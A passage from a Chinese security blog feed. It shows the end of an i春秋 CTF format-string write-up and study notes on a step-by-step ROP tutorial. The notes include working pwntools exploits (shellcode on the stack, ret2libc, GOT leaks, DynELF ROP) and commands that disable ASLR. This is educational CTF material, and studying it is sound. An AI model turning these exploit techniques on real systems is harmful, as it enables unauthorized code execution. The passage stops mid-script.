0x7fffffffdd60 —▸ 0x400ce0 ◂— push   r15</span><br><span class="line">07:0038│      0x7fffffffdd68 —▸ 0x7ffff7a2d830 (__libc_start_main+240) ◂— mov    edi, eax</span><br><span class="line"></span><br><span class="line">pwndbg&amp;gt; x/20gx 0x7fffffffdd38</span><br><span class="line">0x7fffffffdd38:0x6161616b636568430x6161616161616161</span><br><span class="line">0x7fffffffdd48:0x61616161616161610x6161616161616161</span><br><span class="line">0x7fffffffdd58:0x00000005000000000x0000000000400ce0</span><br><span class="line">0x7fffffffdd68:0x00007ffff7a2d8300x0000000000000001</span><br><span class="line">0x7fffffffdd78:0x00007fffffffde480x00000001f7ffcca0</span><br><span class="line">0x7fffffffdd88:0x0000000000400bc60x0000000000000000</span><br></pre></td></tr></table></figure><h3 id="Car-Search-System"><a href="#Car-Search-System" class="headerlink" title="Car Search System"></a>Car Search System</h3><p><strong>格式化字符串漏洞</strong>，关键代码位置如图：</p><p><img src="https://raw.githubusercontent.com/skyedai910/Picbed/master/img/20191204235446.png"></p><p>程序只有 NX 保护。利用思路： printf 处格式化漏洞泄露出 __libc_start_main+247 地址，得出 libc 基地址，将 put.got 覆写为 system ，修改 v7 值，利用 read 函数读入 /bin/sh ，调用 put 函数，触发 system(‘/bin/sh’) 。</p><p>修改 v7 值时，直接修改栈上的值，程序会down，所有可以通过指针 v8 来修改。—-<a href="%5Bhttps://pumpkin9.github.io/2019/11/29/i%E6%98%A5%E7%A7%8B-%E7%AC%AC%E4%B8%89%E5%AD%A3CTF%E7%AD%94%E9%A2%98%E8%B5%9Bwrite-up/%5D(https://pumpkin9.github.io/2019/11/29/i%E6%98%A5%E7%A7%8B-%E7%AC%AC%E4%B8%89%E5%AD%A3CTF%E7%AD%94%E9%A2%98%E8%B5%9Bwrite-up/)">pumpkin9</a></p><p>最终exp如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.terminal=[&amp;<span class="comment">#039;tmux&amp;#039;,&amp;#039;split&amp;#039;,&amp;#039;-h&amp;#039;]</span></span><br><span class="line">context.log_level = &amp;<span class="comment">#039;debug&amp;#039;</span></span><br><span class="line">p = process(&amp;quot;./pwn2&amp;quot;)</span><br><span class="line"><span class="comment">#p = remote(&amp;quot;120.55.43.255&amp;quot;,11001)</span></span><br><span class="line">elf=ELF(&amp;quot;./pwn2&amp;quot;)</span><br><span class="line"><span class="comment"># 自己从本地函数库拉取</span></span><br><span class="line">lib = ELF(&amp;quot;./libc.so<span class="number">.6</span>&amp;quot;)</span><br><span class="line"><span class="comment"># 字符指针到buf偏移</span></span><br><span class="line">offset = <span class="number">30</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># leak libc base addr </span></span><br><span class="line">p.recvuntil(&amp;quot;leave\n&amp;quot;)</span><br><span class="line">p.sendline(&amp;quot;%<span class="number">59</span>$p&amp;quot;) <span class="comment"># 偏移59在eip开头；这里读取的是eip</span></span><br><span class="line">__libc_start_main = <span class="built_in">int</span>(p.recvline().strip(&amp;quot;\n&amp;quot;),<span class="number">16</span>)-<span class="number">247</span></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(__libc_start_main)</span><br><span class="line">libc = __libc_start_main - lib.symbols[&amp;<span class="comment">#039;__libc_start_main&amp;#039;]</span></span><br><span class="line">log.success(&amp;quot;libc base addr : 0x%x&amp;quot;%libc)</span><br><span class="line">system = libc+lib.symbols[&amp;<span class="comment">#039;system&amp;#039;]</span></span><br><span class="line">log.success(&amp;quot;system addr : 0x%x&amp;quot;%system)</span><br><span class="line"></span><br><span class="line"><span class="comment"># overwrite put.got to system</span></span><br><span class="line">p.recvuntil(&amp;quot;leave\n&amp;quot;)</span><br><span class="line">payload = fmtstr_payload(<span class="number">30</span>,&#123;elf.got[&amp;quot;puts&amp;quot;]:system&#125;)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak v7 addr</span></span><br><span class="line">p.recvuntil(&amp;quot;leave\n&amp;quot;)</span><br><span class="line">payload = &amp;quot;%<span class="number">51</span>$p&amp;quot; <span class="comment"># v7 偏移51</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">point = <span class="built_in">int</span>(p.recvline().strip(&amp;quot;\n&amp;quot;),<span class="number">16</span>)</span><br><span class="line">log.success(&amp;quot;v7 addr : 0x%x&amp;quot;%point)</span><br><span class="line"></span><br><span class="line"><span class="comment"># overwrite v7 to 102</span></span><br><span class="line">p.recvuntil(&amp;quot;leave\n&amp;quot;)</span><br><span class="line">payload = p32(point)+&amp;quot;%98c%<span class="number">30</span>$hhn&amp;quot; <span class="comment">#偏移30以单个字节读入ascii为98单个字符</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># get shell</span></span><br><span class="line">p.sendlineafter(&amp;quot;ar <span class="keyword">in</span> <span class="number">7</span> day&amp;quot;,&amp;quot;/<span class="built_in">bin</span>/sh\x00&amp;quot;)</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> i春秋 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>一步一步学ROP之Linux篇 - 学习笔记</title>
      <link href="archives/b999bc1c/"/>
      <url>archives/b999bc1c/</url>
      
        <content type="html"><![CDATA[<blockquote><p>课本地址：<a href="https://segmentfault.com/a/1190000005888964">https://segmentfault.com/a/1190000005888964</a></p><p>笔记中所用到的程序&amp;脚本下载地址：<a href="https://github.com/zhengmin1989/ROP_STEP_BY_STEP(%E5%8E%9F%E4%BD%9C%E8%80%85github%E4%BB%93%E5%BA%93)">https://github.com/zhengmin1989/ROP_STEP_BY_STEP(原作者github仓库)</a></p></blockquote><h1 id="蒸米ROP学习笔记"><a href="#蒸米ROP学习笔记" class="headerlink" title="蒸米ROP学习笔记"></a>蒸米ROP学习笔记</h1><h2 id="基础介绍"><a href="#基础介绍" class="headerlink" title="基础介绍"></a>基础介绍</h2><p>ROP 的全称为 Return-oriented programming （返回导向编程）。是一种高级的内存攻击技术可以用来绕过现代操作系统的各种通用防御（比如内存不可执行和代码签名等）</p><h2 id="x86篇"><a href="#x86篇" class="headerlink" title="x86篇"></a>x86篇</h2><h3 id="level-1-栈上执行shellcode"><a href="#level-1-栈上执行shellcode" class="headerlink" title="level 1 - 栈上执行shellcode"></a>level 1 - 栈上执行shellcode</h3><p>常见的程序流劫持就是栈溢出，格式化字符串攻击和堆溢出。最常见的防御方法有DEP（堆栈不可执行），ASLR（内存地址随机化），Stack Protector（栈保护）等。下面看看这题，程序流劫持。</p><p>初学阶段，先关闭Linux系统的ASLR保护：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo -S</span><br><span class="line">echo 0 &gt; /proc/sys/kernel/randomize_va_space</span><br><span class="line">exit</span><br></pre></td></tr></table></figure><p>下载<code>level1</code>题目，放入到IDA分析，在<code>vulnerable_function()</code>中存在着栈溢出（0x100&gt;88）</p><p><img src="https://raw.githubusercontent.com/skyedai910/Picbed/master/img/%E4%B8%80%E6%AD%A5%E4%B8%80%E6%AD%A5rop.png"></p><p>运行程序，输入一串字符串然后返回helloworld；file查看是个动态链接的32位文件；checksec查看所有安全编译选项都没有开</p><p><img src="https://raw.githubusercontent.com/skyedai910/Picbed/master/img/20191106224653.png"></p><p>然后就是确认溢出点（栈的eip）的位置，使用作者提供的<code>pattern.py</code>脚本进行计算。创建200字节的测试字符串</p><p><img src="https://raw.githubusercontent.com/skyedai910/Picbed/master/img/20191106225249.png"></p><p>然后<code>gdb ./level1</code>调试程序，<code>r</code>运行程序后输入测试字符串，得到内存出错地址：</p><p><img src="https://raw.githubusercontent.com/skyedai910/Picbed/master/img/20191106225456.png"></p><p>查询偏移量，这里的偏移量是指从变量写入处到eip顶内存长度。</p><p><img src="https://raw.githubusercontent.com/skyedai910/Picbed/master/img/20191106225615.png"></p><p>当然，可以自己手动计算。偏移量=0x88+0x4=140。0x4为ebp，0x88为变量空间。</p><p><img src="https://raw.githubusercontent.com/skyedai910/Picbed/master/img/%E4%B8%80%E6%AD%A5%E4%B8%80%E6%AD%A5rop.png"></p><p>只要构造一个<code>[shellcode][“AAAAAAAAAAAAAA”….][ret]</code>字符串，就可以让pc执行ret地址上的代码了。也就是需要知道shellcode所在的内存地址</p><p>这里注意的是用gdb调试程序，然后查内存来确定的shellcode所在位置，是错误的。因为gdb会影响buf的内存位置，即使是关闭ALSR。解决办法之一就是开启 <code>core dump</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ulimit -c unlimited</span><br><span class="line">sudo sh -c &#x27;echo &quot;/tmp/core.%t&quot; &gt; /proc/sys/kernel/core_pattern&#x27;</span><br></pre></td></tr></table></figure><p>开启之后，再次输入测试字符串（或长度大于144的字符串），因此程序内存错误，使系统在<code>/tmp</code>生成一个<code>core dump</code>文件。用gdb查看这个core文件得到真正的buf地址（本机是0xffffcec0，每台机不一样，请实际操作一下）。</p><p><img src="https://raw.githubusercontent.com/skyedai910/Picbed/master/img/20191106235329.png"></p><p><img src="https://raw.githubusercontent.com/skyedai910/Picbed/master/img/20191106235400.png"></p><p>本地EXP</p><blockquote><p>函数、gadget等地址，可能因电脑不同而不一致。请动手操作，获取本机相关地址后，自行替换</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#encoding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./level1&quot;</span>)</span><br><span class="line"></span><br><span class="line">ret_address = <span class="number">0xffffcec0</span> <span class="comment"># 请修改为你获取的shellcode所在的内存地址</span></span><br><span class="line"><span class="comment"># shellcode 可以用msf生成，或者去github找一个，注意长度!</span></span><br><span class="line">shellcode = <span class="string">&quot;\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73&quot;</span></span><br><span class="line">shellcode += <span class="string">&quot;\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0&quot;</span></span><br><span class="line">shellcode += <span class="string">&quot;\x0b\xcd\x80&quot;</span></span><br><span class="line"></span><br><span class="line">payload = shellcode + <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x88</span>+<span class="number">0x4</span>-<span class="built_in">len</span>(shellcode)) + p32(ret_address)</span><br><span class="line"></span><br><span class="line">p.send(payload) </span><br><span class="line">p.interactive() <span class="comment"># 释放控制权</span></span><br></pre></td></tr></table></figure><p>有可能脚本还是不能成功getshell，很大概率是ret的地址错了。我们再一次查找地址，这次加载的最新的core文件（后缀大的）。</p><p><img src="https://raw.githubusercontent.com/skyedai910/Picbed/master/img/20191107092018.png"></p><p>替换为该地址，即可。</p><p>除了本地调试，还有远程部署的方式，如下，将题目绑定到指定端口上：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socat tcp-l:10001,fork exec:.&#x2F;level1</span><br></pre></td></tr></table></figure><p>payload除了将p = process(“./level1”)改为p = remote(“127.0.0.1”, 10001)外，ret的地址还会发生改变。解决方法还是采用生成core dump的方案，然后用gdb调试core文件获取返回地址，即可远程getshell。</p><h3 id="level-2-ret2libc-绕过-DEP-防护"><a href="#level-2-ret2libc-绕过-DEP-防护" class="headerlink" title="level 2  - ret2libc 绕过 DEP 防护"></a>level 2  - ret2libc 绕过 DEP 防护</h3><p>使用<code>checksec</code>检查题目<code>level2</code>，发现打开了NX保护（栈不可执行），也就是说不能像上一题将shellcode写到栈上后执行。</p><p>每个程序都会调用函数库<code>libc.so</code>，而shellcode的执行效果等于<code>system(&quot;/bin/sh&quot;)</code>，问题就是如何获得system和”/bin/sh”的地址。</p><p>我们关闭了系统的ASLR，函数在内存的地址不会变换，字符串也是固定的。这时可以使用gdb进行调试，通过<code>print</code>和<code>find</code>命令查找。</p><p>gdb打开后，首先在main函数上打下断点，然后运行程序，让libc.so函数加载到内存中。使用<code>print system</code>获取system函数的真实地址；使用<code>print __libc_start_main</code>获取libc.so起始地址。使用<code>find [起始地址],[+搜索长度],[字符串]</code>获取”/bin/sh”内存地址。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> gdb level2</span></span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">gef➤  b main</span><br><span class="line">Breakpoint 1 at 0x8048430</span><br><span class="line">gef➤  r</span><br><span class="line">Starting program: /home/skye/rop/level2/level2</span><br><span class="line">Breakpoint 1, 0x08048430 in main ()</span><br><span class="line">gef➤  print system</span><br><span class="line"><span class="meta">$</span><span class="bash">1 = &#123;int (const char *)&#125; 0xf7e19200 &lt;__libc_system&gt;</span></span><br><span class="line">gef➤  print __libc_start_main</span><br><span class="line"><span class="meta">$</span><span class="bash">2 = &#123;int (int (*)(int, char **, char **), int, char **, int (*)(int, char **, char **), void (*)(void), void (*)(void), void *)&#125; 0xf7df4d90 &lt;__libc_start_main&gt;</span></span><br><span class="line">gef➤  find 0xf7df4d90,+2200000,&quot;/bin/sh&quot;</span><br><span class="line">0xf7f5a0cf</span><br><span class="line">warning: Unable to access 16000 bytes of target memory at 0xf7fb7cd7, halting search.</span><br><span class="line">1 pattern found.</span><br></pre></td></tr></table></figure><p>本地EXP</p><blockquote><p>函数、gadget等地址，可能因电脑不同而不一致。请动手操作，获取本机相关地址后，自行替换</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p = process(<span class="string">&quot;./level2&quot;</span>)</span><br><span class="line"></span><br><span class="line">system_addr = <span class="number">0xf7e19200</span></span><br><span class="line">binsh_addr = <span class="number">0xf7f5a0cf</span></span><br><span class="line">ret = <span class="number">0xdeadbeef</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">140</span> + p32(system_addr) + p32(ret) + p32(binsh_addr)</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="level-2-通过-ROP-绕过-DEP-和-ASLR-防护"><a href="#level-2-通过-ROP-绕过-DEP-和-ASLR-防护" class="headerlink" title="level 2  - 通过 ROP 绕过 DEP 和 ASLR 防护"></a>level 2  - 通过 ROP 绕过 DEP 和 ASLR 防护</h3><p>打开ALSR保护：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo -s</span><br><span class="line">echo 2 &gt; /proc/sys/kernel/randomize_va_space</span><br></pre></td></tr></table></figure><p>开ALSR之后，我们每次从gdb中查找的地址都是变化的。但是程序本身在内存中的地址并不是随机的。如图所示：</p><p><img src="https://raw.githubusercontent.com/skyedai910/Picbed/master/img/20191107140517.png"></p><p>思路是：我们泄露出libc.so某些函数在内存中地址，然后利用泄露出来的函数地址根据函数的偏移量计算得出system()和”/bin/sh”的内存地址，然后执行system(“/bin/sh”)</p><p>由于题目没有给出libc.so，使用<code>ldd</code>命令查询程序调用的函数库，然后将函数库文件拷贝当前目录</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> ldd level2</span></span><br><span class="line">linux-gate.so.1 (0xf7fd4000)</span><br><span class="line">libc.so.6 =&gt; /lib/i386-linux-gnu/libc.so.6 (0xf7ddc000)</span><br><span class="line">/lib/ld-linux.so.2 (0xf7fd6000)</span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo cp /lib/i386-linux-gnu/libc.so.6 libc.so</span></span><br></pre></td></tr></table></figure><p>利用objdump查看程序的plt和got表，因为我们只能先利用程序所使用的函数，去泄露对应的地址。（图一.plt表，图二.got表）</p><p><img src="https://raw.githubusercontent.com/skyedai910/Picbed/master/img/20191107142252.png"></p><p><img src="https://raw.githubusercontent.com/skyedai910/Picbed/master/img/20191107142806.png"></p><p>这里我们使用<code>write@plt()</code>函数把存储在<code>write@GLIBC_2.0</code>(或称<code>write.got</code>)的<code>write()</code>函数的内存地址打印出来。然后计算system()和”/bin/sh”与write()在函数库libc.so中的offset（相对地址）得到最后的地址。</p><blockquote><p>Q: 为什么用的是调用write@plt()打印write@got()？</p><p>A:<code>write()</code>函数实现是在<code>libc.so</code>当中，那我们调用的<code>write@plt()</code>函数为什么也能实现<code>write()</code>功能呢? 这是因为linux采用了延时绑定技术，当我们调用<code>write@plit()</code>的时候，系统会将真正的<code>write()</code>函数地址link到got表的<code>write.got</code>中，然后<code>write@plit()</code>会根据<code>write.got</code> 跳转到真正的<code>write()</code>函数上去。（如果还是搞不清楚的话，推荐阅读《程序员的自我修养 - 链接、装载与库》这本书）</p></blockquote><p>再将pc指针return回<code>vulnerable_function()</code>函数，就可以进行ret2libc溢出攻击，并且这一次我们知道了<code>system()</code>在内存中的地址，就可以调用<code>system()</code>函数来获取我们的shell了。</p><p>本地EXP</p><blockquote><p>函数、gadget等地址，可能因电脑不同而不一致。请动手操作，获取本机相关地址后，自行替换</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./level2&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc.so&quot;</span>)</span><br><span class="line">p = process(<span class="string">&quot;./level2&quot;</span>)</span><br><span class="line"></span><br><span class="line">write_plt = elf.symbols[<span class="string">&#x27;write&#x27;</span>] <span class="comment"># 获取程序中的write.plt</span></span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>] <span class="comment"># 获取程序中的write.got</span></span><br><span class="line">vulfun_addr = <span class="number">0x08048404</span> <span class="comment"># 漏洞函数地址</span></span><br><span class="line">payload_1 = <span class="string">&#x27;a&#x27;</span>*<span class="number">140</span> + p32(write_plt) + p32(vulfun_addr) + p32(<span class="number">1</span>) + p32(write_got) + p32(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">p.send(payload_1)</span><br><span class="line">write_addr = u32(p.recv(<span class="number">4</span>)) <span class="comment"># 接受返回的内存地址</span></span><br><span class="line"></span><br><span class="line">libc_addr = write_addr - libc.symbols[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">system_addr = libc_addr + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh_addr = libc_addr + <span class="built_in">next</span>(libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>)) <span class="comment"># 寻找字符串地址</span></span><br><span class="line">payload_2 = <span class="string">&#x27;a&#x27;</span>*<span class="number">140</span> + p32(system_addr) + p32(vulfun_addr) + p32(binsh_addr)</span><br><span class="line"></span><br><span class="line">p.send(payload_2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="level-2-在不获取目标libc-so的情况下进行ROP攻击"><a href="#level-2-在不获取目标libc-so的情况下进行ROP攻击" class="headerlink" title="level 2  - 在不获取目标libc.so的情况下进行ROP攻击"></a>level 2  - 在不获取目标libc.so的情况下进行ROP攻击</h3><p>如果不能获取目标机器上的libc.so或者具体的linux版本号，应该怎么计算得出偏移地址（offset）？</p><p>利用DynELF模块通过内存泄露(memory leak)来搜索内存中的system()地址。需要的是一个<code>lead(address)</code>函数。由于DynELF模块只能取得system()地址，所以需要调用read()或其他函数，将<code>/bin/sh</code>写入到程序的非随机段（如.bss段）。通过<code>readelf -S level2</code>或者在IDA中快捷键<code>ctrl+s</code>获取到bss段的地址。</p><p><img src="https://raw.githubusercontent.com/skyedai910/Picbed/master/img/20191109230630.png"></p><p><img src="https://raw.githubusercontent.com/skyedai910/Picbed/master/img/20191109231111.png"></p><p>因为我们在执行完read()之后要接着调用system(“/bin/sh”)，并且read()这个函数的参数有三个，所以我们需要一个pop pop pop ret的gadget用来保证栈平衡。利用的是ROPgadget工具快速查找可用gadget，<code>ROPgadget --binary level2 --only &quot;pop|ret&quot;</code></p><p><img src="https://raw.githubusercontent.com/skyedai910/Picbed/master/img/20191109231537.png"></p><p>攻击思路：首先通过DynELF获取到system()地址，通过read()将“/bin/sh”写入到.bss段，通过gadget清空read()栈上参数后，调用system(“/bin/sh”)。</p><p>本地EXP</p><blockquote><p>函数、gadget等地址，可能因电脑不同而不一致。请动手操作，获取本机相关地址后，自行替换</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding = utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./level2&#x27;</span>)</span><br><span class="line">plt_write = elf.symbols[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">plt_read = elf.symbols[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">vulfun_addr = <span class="number">0x08048404</span> <span class="comment"># 请根据实际而替换</span></span><br><span class="line">bss_addr = <span class="number">0x0804a018</span> <span class="comment"># 请根据实际而替换 </span></span><br><span class="line">pppr = <span class="number">0x080484bd</span> <span class="comment"># 请根据实际而替换</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span>(<span class="params">address</span>):</span></span><br><span class="line">    payload1 = <span class="string">&#x27;a&#x27;</span>*<span class="number">140</span> + p32(plt_write) + p32(vulfun_addr) + p32(<span class="number">1</span>) +p32(address) + p32(<span class="number">4</span>)</span><br><span class="line">    p.send(payload1)</span><br><span class="line">    data = p.recv(<span class="number">4</span>)</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;%#x =&gt; %s&quot;</span> % (address, (data <span class="keyword">or</span> <span class="string">&#x27;&#x27;</span>).encode(<span class="string">&#x27;hex&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./level2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">d = DynELF(leak, elf=ELF(<span class="string">&#x27;./level2&#x27;</span>))</span><br><span class="line"></span><br><span class="line">system_addr = d.lookup(<span class="string">&#x27;system&#x27;</span>, <span class="string">&#x27;libc&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;system_addr=&quot;</span> + <span class="built_in">hex</span>(system_addr)</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">&#x27;a&#x27;</span>*<span class="number">140</span>  + p32(plt_read) + p32(pppr) + p32(<span class="number">0</span>) + p32(bss_addr) + p32(<span class="number">8</span>) <span class="comment"># 写入read部分</span></span><br><span class="line">payload2 += p32(system_addr) + p32(vulfun_addr) + p32(bss_addr) <span class="comment"># 调用system部分</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;\n###sending payload2 ...###&quot;</span></span><br><span class="line">p.send(payload2)</span><br><span class="line">p.send(<span class="string">&quot;/bin/sh\0&quot;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><hr><h2 id="linux-64与linux-86的区别"><a href="#linux-64与linux-86的区别" class="headerlink" title="linux_64与linux_86的区别"></a>linux_64与linux_86的区别</h2><p>linux_64与linux_86的区别主要有两点：<strong>首先是内存地址的范围由32位变成了64位</strong>。但是可以使用的内存地址不能大于0x00007fffffffffff，否则会抛出异常。<strong>其次是函数参数的传递方式发生了改变</strong>，x86中参数都是保存在栈上，但在x64中的前六个参数依次保存在RDI，RSI，RDX，RCX，R8和 R9中，如果还有更多的参数的话才会保存在栈上。</p><h2 id="x64篇"><a href="#x64篇" class="headerlink" title="x64篇"></a>x64篇</h2><h3 id="level-3-通过-ROP-绕过-DEP-和-ASLR-防护"><a href="#level-3-通过-ROP-绕过-DEP-和-ASLR-防护" class="headerlink" title="level 3  -  通过 ROP 绕过 DEP 和 ASLR 防护"></a>level 3  -  通过 ROP 绕过 DEP 和 ASLR 防护</h3><p>老样子，在漏洞函数中，存在着栈溢出。程序中也有预留的后门函数<code>callsystem</code>。思路就是利用栈溢出，覆写rip为后门函数内存地址<code>0x0000000000400584</code>。</p><p><img src="https://raw.githubusercontent.com/skyedai910/Picbed/master/img/20191127233714.png"></p><p>这里计算溢出需要的覆写长度，不采取原文中的方法，而是通过IDA分析计算得出，具体计算如下：0x80 + 0x8 。覆写完成后的位置到达 rip 上一个内存空间。</p><p>最终exp如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!python</span></span><br><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;level3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./level3&#x27;</span>)</span><br><span class="line"><span class="comment">#p = remote(&#x27;127.0.0.1&#x27;,10001)</span></span><br><span class="line"></span><br><span class="line">callsystem = <span class="number">0x0000000000400584</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;A&quot;</span>*<span class="number">136</span> + p64(callsystem)</span><br><span class="line"></span><br><span 